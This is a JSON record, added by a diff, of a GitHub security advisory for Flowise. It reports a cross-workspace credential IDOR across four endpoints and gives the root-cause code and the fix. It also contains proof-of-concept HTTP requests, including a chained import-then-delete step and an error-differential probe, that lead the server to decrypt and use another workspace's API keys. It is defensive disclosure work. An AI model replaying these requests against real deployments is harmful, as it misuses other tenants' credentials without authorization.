@@ -1,0 +1,54 @@
+{
+  "global": null,
+  "id": "GHSA-27w2-26m5-x82c",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 7.6,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-639"
+    ],
+    "description": "### Summary\r\n\r\nFour new findings sharing the same root cause as the original vector-store IDOR: `findOneBy({ id: credentialId })` with no `workspaceId` filter. An authenticated user can supply a foreign credential UUID to decrypt and use another workspace's OpenAI or ElevenLabs API key.\r\n\r\n| # | Service / function | Endpoint | RBAC required |\r\n|---|---|---|---|\r\n| 1 | `getAllOpenaiAssistants`, `getSingleOpenaiAssistant` | `GET /api/v1/openai-assistants`, `GET /api/v1/openai-assistants/:id` | `assistants:view` |\r\n| 2 | `uploadFilesToAssistant` | `POST /api/v1/openai-assistants-file/upload/` | auth only |\r\n| 3 | `deleteAssistant` (L185, chained) | `DELETE /api/v1/assistants/:id` | `workspace:import` + `assistants:delete` |\r\n| 4 | `getVoices` | `GET /api/v1/text-to-speech/voices` | auth only |\r\n\r\n---\r\n\r\n### Root Cause\r\n\r\nSame pattern repeated across four locations:\r\n\r\n```typescript\r\n// openai-assistants/index.ts: L18, L46, L87\r\n// assistants/index.ts: L185\r\n// packages/components/src/utils.ts: L668 (shared helper - used by TTS getVoices)\r\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\r\n    id: credentialId   // no workspaceId filter\r\n})\r\n```\r\n\r\nSafe pattern (used correctly in `createAssistant` L57, `updateAssistant` L332, credentials service L130):\r\n\r\n```typescript\r\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\r\n    id: credentialId,\r\n    workspaceId: workspaceId\r\n})\r\n```\r\n\r\n---\r\n\r\n### Proof of Concept\r\n\r\nAll verified live against `flowiseai/flowise:3.1.2` (Docker).  \r\n**Error differential used throughout:** nonexistent UUID → `\"Credential not found\"` / `\"Please pass in your API Key\"`; real foreign UUID → downstream provider error (`\"401 Unauthorized - check your API key\"` or `\"invalid_api_key\"`), proving cross-workspace credential was fetched, decrypted, and used.\r\n\r\n---\r\n\r\n#### Finding 1 - openai-assistants service\r\n\r\nVerified **2026-04-17**.\r\n\r\n```\r\nGET /api/v1/openai-assistants?credential=<workspace-b-uuid>\r\nCookie: token=<workspace-a-jwt>\r\n\r\n→ 500 {\"message\": \"401 Unauthorized - check your API key...\"}    ← cross-workspace\r\n→ 500 {\"message\": \"Error: openaiAssistantsService.getAllOpenaiAssistants - Credential <uuid> not found in the database!\"}  ← control\r\n```\r\n\r\n---\r\n\r\n#### Finding 2 - openai-assistants-file upload\r\n\r\nVerified **2026-04-21** using Codex.\r\n\r\n```\r\nPOST /api/v1/openai-assistants-file/upload/?credential=<workspace-b-uuid>\r\nAuthorization: Bearer <workspace-a-api-key>\r\n\r\n→ 500 {\"message\": \"401 Unauthorized - check your API key...\"}    ← cross-workspace\r\n→ 404 {\"message\": \"Credential 00000000-... not found in the database!\"}  ← control\r\n```\r\n\r\n---\r\n\r\n#### Finding 3 - deleteAssistant (chained via workspace import)\r\n\r\nVerified **2026-04-21** using Codex.\r\n\r\n`deleteAssistant` is asymmetric: `createAssistant` (L57) and `updateAssistant` (L332) correctly include `workspaceId`; `deleteAssistant` (L185) does not. Exploitation requires importing an assistant row whose `credential` field references a foreign workspace UUID via `POST /api/v1/export-import/import` (`workspace:import` permission).\r\n\r\n```\r\n# Step 1 - poison an assistant row in Workspace A pointing to Workspace B's credential\r\nPOST /api/v1/export-import/import\r\nAuthorization: Bearer <workspace-a-api-key>\r\n{\"AssistantOpenAI\":[{\"id\":\"...\",\"credential\":\"<workspace-b-uuid>\",\"type\":\"OPENAI\",...}]}\r\n→ 200 {\"message\":\"success\"}\r\n\r\n# Step 2 - delete triggers cross-workspace credential lookup\r\nDELETE /api/v1/assistants/<poisoned-id>?isDeleteBoth=true\r\nAuthorization: Bearer <workspace-a-api-key>\r\n\r\n→ 500 {\"message\": \"401 Unauthorized - check your API key...\"}    ← cross-workspace\r\n→ 500 {\"message\": \"Error: assistantsService.deleteAssistant - Error deleting assistant - Credential <uuid> not found\"}  ← control\r\n```\r\n\r\n---\r\n\r\n#### Finding 4 - TTS getVoices\r\n\r\nVerified **2026-04-21** using Codex.\r\n\r\nNo per-route RBAC - any authenticated user can reach this endpoint. OpenAI returns a static voice list regardless of credential validity; ElevenLabs makes a live API call and is used for the differential.\r\n\r\n```\r\nGET /api/v1/text-to-speech/voices?provider=elevenlabs&credentialId=<workspace-b-uuid>\r\nAuthorization: Bearer <workspace-a-api-key>\r\n\r\n→ 500 {\"message\": \"...invalid_api_key...\"}                       ← cross-workspace\r\n→ 500 {\"message\": \"Please pass in your ElevenLabs API Key\"}      ← control\r\n```\r\n\r\n---\r\n\r\n### Impact\r\n\r\n- **Findings 1, 2, 4** - any authenticated user (with relevant RBAC for F1) can trigger decryption and use of any workspace's OpenAI or ElevenLabs credential by supplying its UUID\r\n- **Finding 3** - attacker with `workspace:import` + `assistants:delete` can trigger cross-workspace credential decryption and OpenAI API use via a poisoned assistant row\r\n\r\n---\r\n\r\n### Fix\r\n\r\nAdd `workspaceId` filter to every credential lookup, sourcing from `req.user.activeWorkspaceId`:\r\n\r\n```typescript\r\nconst credential = await appServer.AppDataSource.getRepository(Credential).findOneBy({\r\n    id: credentialId,\r\n    workspaceId: workspaceId\r\n})\r\n```\r\n\r\nFiles:\r\n- `packages/server/src/services/openai-assistants/index.ts` (L18, L46, L87)\r\n- `packages/server/src/services/assistants/index.ts:185`\r\n- `packages/components/src/utils.ts:668`\r\n",
+    "ghsa_id": "GHSA-27w2-26m5-x82c",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-27w2-26m5-x82c",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-27w2-26m5-x82c"
+      }
+    ],
+    "published_at": "2026-09-10T14:18:51Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Cross-Workspace Credential IDOR",
+    "updated_at": "2026-09-10T14:18:51Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 3.1.4"
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<= 3.1.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
